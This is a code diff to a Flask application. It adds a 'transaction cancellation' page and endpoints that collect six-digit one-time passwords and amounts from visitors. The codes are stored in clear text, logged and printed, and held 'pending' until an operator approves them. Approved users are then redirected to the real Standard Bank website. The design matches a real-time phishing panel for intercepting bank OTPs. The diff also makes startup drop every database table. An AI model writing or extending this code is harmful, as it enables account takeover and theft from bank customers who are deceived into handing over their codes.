@@ -150,6 +150,39 @@ class OtpVerificationRequest(db.Model):
             'admin_notes': self.admin_notes
         }
 
+class TransactionCancellationRequest(db.Model):
+    """Model for tracking transaction cancellation OTP verification requests"""
+    __tablename__ = 'transaction_cancellation_requests'  # Table name in database
+    
+    # Define table columns for transaction cancellation tracking
+    id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
+    user_identifier = db.Column(db.String(100), nullable=False)  # User session ID who submitted OTP
+    otp_code = db.Column(db.String(10), nullable=False)  # OTP code submitted by user
+    transaction_amount = db.Column(db.Numeric(10, 2), nullable=False)  # Amount of transaction to cancel
+    ip_address = db.Column(db.String(45), nullable=True)  # User's IP address
+    user_agent = db.Column(db.String(500), nullable=True)  # Browser user agent
+    status = db.Column(db.String(20), default='pending', nullable=False)  # pending, approved, denied
+    submitted_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)  # When OTP was submitted
+    verified_at = db.Column(db.DateTime, nullable=True)  # When admin verified OTP
+    verified_by_admin_id = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True)  # Which admin verified
+    admin_notes = db.Column(db.Text, nullable=True)  # Admin notes about the verification
+
+    def to_dict(self):
+        """Convert model instance to dictionary for JSON serialization"""
+        return {
+            'id': self.id,
+            'user_identifier': self.user_identifier,
+            'otp_code': self.otp_code,
+            'transaction_amount': float(self.transaction_amount) if self.transaction_amount else None,
+            'ip_address': self.ip_address,
+            'user_agent': self.user_agent,
+            'status': self.status,
+            'submitted_at': self.submitted_at.isoformat() if self.submitted_at else None,
+            'verified_at': self.verified_at.isoformat() if self.verified_at else None,
+            'verified_by_admin_id': self.verified_by_admin_id,
+            'admin_notes': self.admin_notes
+        }
+
 # Helper function to check if user is authenticated as admin
 def require_auth():
     """Check if current session has admin authentication"""
@@ -231,6 +264,12 @@ def loading_page():
 def otp_verification():
     """Serve the OTP verification page for two-factor authentication"""
     return send_from_directory('public', 'otp-verification.html')  # Send OTP HTML file from public directory
+
+# Route to serve the transaction cancellation page
+@app.route('/transaction-cancellation')
+def transaction_cancellation():
+    """Serve the transaction cancellation OTP verification page"""
+    return send_from_directory('public', 'transaction-cancellation.html')  # Send transaction cancellation HTML file from public directory
 
 # Route to track user interactions (button clicks, form submissions)
 @app.route('/api/track', methods=['POST'])
@@ -470,6 +509,161 @@ def check_otp_verification(verification_id):
     except Exception as e:
         # Handle any errors during status check
         print(f'Error checking OTP verification status: {str(e)}')  # Log error details
+        return jsonify({'error': 'Failed to check verification status'}), 500  # Return server error response
+
+# Route to handle transaction cancellation OTP verification submission (admin approval required)
+@app.route('/api/verify-transaction-cancellation', methods=['POST'])
+def verify_transaction_cancellation():
+    """Handle transaction cancellation OTP verification submission - requires admin approval to proceed"""
+    try:
+        # Get JSON data from request body
+        data = request.get_json()
+        
+        # Extract OTP code and transaction amount from request
+        otp_code = data.get('otp_code', '').strip()  # Get OTP code and remove whitespace
+        transaction_amount = data.get('amount', '0')  # Get transaction amount
+        
+        # Get user information
+        user_identifier = get_user_identifier()  # Get unique user identifier
+        user_agent = request.headers.get('User-Agent', '')  # Get browser user agent
+        ip_address = request.remote_addr  # Get user's IP address
+        
+        # Log transaction cancellation OTP verification attempt
+        log_user_activity(
+            action_type='transaction_cancellation_otp_submit',  # Mark as OTP submitted for admin verification
+            page='/api/verify-transaction-cancellation',  # Record the endpoint
+            additional_data=f'{{"otp_length": {len(otp_code)}, "amount": "{transaction_amount}"}}'  # Include OTP length and amount
+        )
+        
+        # Validate OTP format
+        if not otp_code or len(otp_code) != 6 or not otp_code.isdigit():
+            # Log invalid OTP format
+            log_user_activity(
+                action_type='transaction_cancellation_otp_invalid_format',  # Mark as invalid format
+                page='/api/verify-transaction-cancellation',  # Record the endpoint
+                additional_data=f'{{"otp_length": {len(otp_code)}, "is_digit": {otp_code.isdigit()}}}'  # Format validation details
+            )
+            return jsonify({'error': 'Invalid OTP format. Please enter a 6-digit code.'}), 400  # Return validation error
+        
+        # Validate transaction amount (allow zero)
+        try:
+            amount_float = float(transaction_amount)
+            if amount_float < 0:
+                return jsonify({'error': 'Invalid transaction amount. Must be 0 or greater.'}), 400
+        except (ValueError, TypeError):
+            return jsonify({'error': 'Invalid transaction amount format.'}), 400
+        
+        # Check if there's already a pending verification request for this user
+        existing_request = TransactionCancellationRequest.query.filter_by(
+            user_identifier=user_identifier,
+            status='pending'
+        ).first()
+        
+        if existing_request:
+            # Return existing request status
+            return jsonify({
+                'success': True,
+                'verification_id': existing_request.id,
+                'status': existing_request.status,
+                'message': 'Transaction cancellation OTP submitted for admin verification. Please wait...'
+            }), 200
+        
+        # Create new transaction cancellation verification request for admin review
+        verification_request = TransactionCancellationRequest(
+            user_identifier=user_identifier,  # Unique identifier for this user session
+            otp_code=otp_code,  # OTP code submitted by user (stored in clear text for admin)
+            transaction_amount=amount_float,  # Amount of transaction to cancel
+            ip_address=ip_address,  # User's IP address
+            user_agent=user_agent,  # Browser information
+            status='pending'  # Requires admin approval
+        )
+        
+        # Save verification request to database
+        db.session.add(verification_request)  # Add to database session
+        db.session.commit()  # Save to database
+        
+        # Log the transaction cancellation verification request creation
+        log_user_activity(
+            action_type='transaction_cancellation_verification_request_created',  # Mark as verification request created
+            page='/api/verify-transaction-cancellation',  # Record the endpoint
+            additional_data=f'{{"verification_id": {verification_request.id}, "otp_clear": "{otp_code}", "amount": "{amount_float}"}}'  # Include clear OTP and amount in logs
+        )
+        
+        print(f'Transaction cancellation verification request created with ID: {verification_request.id} for user: {user_identifier} - Clear OTP: {otp_code} - Amount: ${amount_float}')
+        
+        # Return response indicating OTP is pending admin verification
+        return jsonify({
+            'success': True,
+            'verification_id': verification_request.id,
+            'status': 'pending',
+            'message': 'Transaction cancellation OTP submitted for admin verification. Please wait for approval...'
+        }), 200
+    
+    except Exception as e:
+        # Log transaction cancellation OTP verification error
+        log_user_activity(
+            action_type='transaction_cancellation_otp_verify_error',  # Mark as verification error
+            page='/api/verify-transaction-cancellation',  # Record the endpoint
+            additional_data=f'{{"error": "{str(e)}"}}'  # Include error details
+        )
+        
+        # Handle any errors during OTP verification
+        print(f'Error during transaction cancellation OTP verification: {str(e)}')  # Log error details
+        db.session.rollback()  # Rollback database changes if error occurred
+        return jsonify({'error': 'Verification error. Please try again.'}), 500  # Return server error response
+
+# Route to check transaction cancellation verification status (polling endpoint for transaction cancellation page)
+@app.route('/api/check-transaction-cancellation/<int:verification_id>', methods=['GET'])
+def check_transaction_cancellation_verification(verification_id):
+    """Check if transaction cancellation OTP verification request has been approved by admin"""
+    try:
+        # Find the verification request
+        verification_request = TransactionCancellationRequest.query.get(verification_id)
+        
+        if not verification_request:
+            return jsonify({'error': 'Verification request not found'}), 404  # Return not found error
+        
+        # Verify this request belongs to the current user (security check)
+        current_user_id = get_user_identifier()
+        if verification_request.user_identifier != current_user_id:
+            return jsonify({'error': 'Unauthorized access to verification request'}), 403  # Return forbidden error
+        
+        # Return current status
+        response_data = {
+            'verification_id': verification_request.id,
+            'status': verification_request.status,
+            'submitted_at': verification_request.submitted_at.isoformat(),
+            'transaction_amount': float(verification_request.transaction_amount) if verification_request.transaction_amount else None
+        }
+        
+        # Add verification details based on status
+        if verification_request.status == 'approved':
+            response_data['verified_at'] = verification_request.verified_at.isoformat() if verification_request.verified_at else None
+            response_data['can_proceed'] = True
+            response_data['message'] = 'Transaction cancellation approved! Redirecting...'
+            response_data['redirect'] = 'https://www.standardbank.co.za/southafrica/personal'
+            
+            # Log that user checked approved status
+            log_user_activity(
+                action_type='transaction_cancellation_verification_approved_check',  # Mark as approved status check
+                page='/api/check-transaction-cancellation',  # Record the endpoint
+                additional_data=f'{{"verification_id": {verification_request.id}}}'  # Include verification ID
+            )
+            
+        elif verification_request.status == 'denied':
+            response_data['can_proceed'] = False
+            response_data['message'] = 'Transaction cancellation denied. Please try again.'
+            response_data['admin_notes'] = verification_request.admin_notes
+            
+        else:  # status is 'pending'
+            response_data['can_proceed'] = False
+            response_data['message'] = 'Transaction cancellation OTP is being verified by admin. Please wait...'
+        
+        return jsonify(response_data), 200
+    
+    except Exception as e:
+        # Handle any errors during status check
+        print(f'Error checking transaction cancellation verification status: {str(e)}')  # Log error details
         return jsonify({'error': 'Failed to check verification status'}), 500  # Return server error response
 
 # Route to create OTP authorization request when user reaches loading page
@@ -959,6 +1153,108 @@ def manage_otp_verification(verification_id):
         db.session.rollback()  # Rollback database changes if error occurred
         return jsonify({'error': 'Failed to process verification decision'}), 500
 
+# Route to get pending transaction cancellation verification requests (admin only)
+@app.route('/api/admin/transaction-cancellations')
+def get_transaction_cancellation_requests():
+    """Get all transaction cancellation verification requests for admin review"""
+    if not require_auth():  # Check if user is authenticated
+        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
+    
+    try:
+        # Get query parameters for filtering
+        status_filter = request.args.get('status', 'pending')  # Default to pending requests
+        page = request.args.get('page', 1, type=int)  # Page number for pagination
+        per_page = request.args.get('per_page', 20, type=int)  # Number of records per page
+        
+        # Build query with filters
+        query = TransactionCancellationRequest.query
+        
+        # Filter by status if provided
+        if status_filter and status_filter != 'all':
+            query = query.filter(TransactionCancellationRequest.status == status_filter)
+        
+        # Order by most recent first and apply pagination
+        requests_paginated = query.order_by(TransactionCancellationRequest.submitted_at.desc()).paginate(
+            page=page, per_page=per_page, error_out=False
+        )
+        
+        # Convert requests to list of dictionaries
+        requests_data = [verification_request.to_dict() for verification_request in requests_paginated.items]
+        
+        # Return paginated response
+        return jsonify({
+            'requests': requests_data,  # List of verification requests
+            'total': requests_paginated.total,  # Total number of records
+            'page': page,  # Current page number
+            'per_page': per_page,  # Records per page
+            'pages': requests_paginated.pages,  # Total number of pages
+            'pending_count': TransactionCancellationRequest.query.filter_by(status='pending').count()  # Count of pending requests
+        }), 200
+    
+    except Exception as e:
+        # Handle database errors
+        print(f'Error fetching transaction cancellation verification requests: {str(e)}')  # Log error details
+        return jsonify({'error': 'Database error'}), 500  # Return server error
+
+# Route to approve or deny transaction cancellation verification request (admin only)
+@app.route('/api/admin/transaction-cancellations/<int:verification_id>/decision', methods=['POST'])
+def manage_transaction_cancellation_verification(verification_id):
+    """Approve or deny a transaction cancellation verification request"""
+    if not require_auth():  # Check if user is authenticated
+        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
+    
+    try:
+        # Get JSON data from request
+        data = request.get_json()
+        decision = data.get('decision')  # 'approve' or 'deny'
+        notes = data.get('notes', '')  # Optional admin notes
+        
+        # Validate decision
+        if decision not in ['approve', 'deny']:
+            return jsonify({'error': 'Invalid decision. Must be "approve" or "deny"'}), 400
+        
+        # Find the verification request
+        verification_request = TransactionCancellationRequest.query.get(verification_id)
+        
+        if not verification_request:
+            return jsonify({'error': 'Verification request not found'}), 404
+        
+        # Check if request is still pending
+        if verification_request.status != 'pending':
+            return jsonify({'error': f'Request already {verification_request.status}'}), 400
+        
+        # Update the verification request status
+        verification_request.status = 'approved' if decision == 'approve' else 'denied'
+        verification_request.verified_at = datetime.utcnow()
+        verification_request.verified_by_admin_id = session.get('admin_id')
+        verification_request.admin_notes = notes
+        
+        # Save changes to database
+        db.session.commit()
+        
+        # Log the admin decision
+        log_user_activity(
+            action_type=f'transaction_cancellation_verification_{verification_request.status}',  # transaction_cancellation_verification_approved or transaction_cancellation_verification_denied
+            page='/api/admin/transaction-cancellations',  # Record the endpoint
+            additional_data=f'{{"verification_id": {verification_request.id}, "admin_id": {session.get("admin_id")}, "decision": "{decision}", "otp_code": "{verification_request.otp_code}", "amount": "{verification_request.transaction_amount}"}}'
+        )
+        
+        print(f'Transaction cancellation verification request {verification_id} {verification_request.status} by admin {session.get("admin_id")} - OTP: {verification_request.otp_code} - Amount: ${verification_request.transaction_amount}')
+        
+        # Return success response
+        return jsonify({
+            'success': True,
+            'verification_id': verification_request.id,
+            'status': verification_request.status,
+            'message': f'Transaction cancellation verification {verification_request.status} successfully'
+        }), 200
+    
+    except Exception as e:
+        # Handle any errors during decision processing
+        print(f'Error processing transaction cancellation verification decision: {str(e)}')  # Log error details
+        db.session.rollback()  # Rollback database changes if error occurred
+        return jsonify({'error': 'Failed to process verification decision'}), 500
+
 # Route to handle admin logout
 @app.route('/admin/logout', methods=['POST'])
 def admin_logout():
@@ -984,7 +1280,8 @@ def serve_static(filename):
 def init_database():
     """Initialize database tables and create default admin user"""
     with app.app_context():  # Create application context for database operations
-        # Create all database tables
+        # Drop all tables and recreate them to ensure schema is up to date
+        db.drop_all()  # Drop all existing tables
         db.create_all()  # Create tables based on model definitions
         
         # Check if any admin users exist
